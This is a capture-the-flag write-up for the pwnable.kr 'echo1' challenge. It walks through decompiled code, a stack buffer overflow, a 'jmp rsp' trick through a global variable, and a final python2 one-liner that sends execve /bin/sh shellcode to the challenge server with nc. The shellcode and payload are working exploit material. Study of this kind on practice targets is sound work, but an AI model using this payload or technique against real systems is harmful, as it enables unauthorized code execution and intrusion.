
 # LEVEL - echo1
 
 in tis level we get an executebel file we run it true ida and we get sit code:
 ```
 int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // rax
  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
  int v6[4]; // [rsp+10h] [rbp-20h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  o = malloc(0x28uLL);
  *((_QWORD *)o + 3) = greetings;
  *((_QWORD *)o + 4) = byebye;
  printf("hey, what's your name? : ");
  __isoc99_scanf("%24s", v6);
  v3 = o;
  *(_QWORD *)o = v6[0];
  v3[1] = v6[1];
  v3[2] = v6[2];
  id = v6[0];
  getchar();
  func[0] = (__int64)echo1;
  qword_602088 = (__int64)echo2;
  qword_602090 = (__int64)echo3;
  for ( i = 0; i != 'y'; i = getchar() )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        puts("\n- select echo type -");
        puts("- 1. : BOF echo");
        puts("- 2. : FSB echo");
        puts("- 3. : UAF echo");
        puts("- 4. : exit");
        printf("> ");
        __isoc99_scanf("%d", &i);
        getchar();
        if ( i > 3 )
          break;
        ((void (*)(void))func[i - 1])();
      }
      if ( i == 4 )
        break;
      puts("invalid menu");
    }
    cleanup();
    printf("Are you sure you want to exit? (y/n)");
  }
  puts("bye");
  return 0;
}
```
so if we go to the function echo1:
```
__int64 echo1()
{
  char s[32]; // [rsp+0h] [rbp-20h] BYREF

  (*((void (__fastcall **)(void *))o + 3))(o);
  get_input(s, 128LL);
  puts(s);
  (*((void (__fastcall **)(void *))o + 4))(o);
  return 0LL;
}
```
get_input is just f_gets so we see that we can buffer overflow here becuse we can write 128 cherecters into a string of size 32 
so we think a bout changing the ret pointer so we look at the addres of s and the ret pointer and we get that the string s is 
40 bytes away of the ret pointer so we can overflow him so now we checksec the file (checksec --file=echo1) we see that NX is off 
so we can execute code from the stack know we will gwt our attention on the id verbel in the main function we see that 
```
id = v6[0]
```
v6 is a array of int so every slot in the array worth 4 bytes so we put in id 4 chars becuse one char is worth 1 byte becuse the PIE is also off we now that the global verebels dont change adresses so we can write ashellcode to the id and then with the buffer overflow return to id and execuse the id because we have only 4 chars we cant write bin/sh shell code so what we will do is use the sp register we know that
the sp register at the buffer overflow will hold the ret pointer with is the id addres and then after the ret of the function will incress by 8 bytes so what we can do is to put a shell code of jmp RSP in id and we will jump to the shell code.
is get after the firest 8 byets after the bufeer overflow we can in sert a bin/sh shell code and then we will get the flag
the adress of id is 0x6020a0 and the shell code is \x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05
so we will execute:
(python2 -c "print('\xff\xe4\x00\x00\n' +'1\n' + 'a'*40 +'\xa0\x20\x60\x00\x00\x00\x00\x00\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05\n')"; cat) | nc pwnable.kr 9010

eli :)
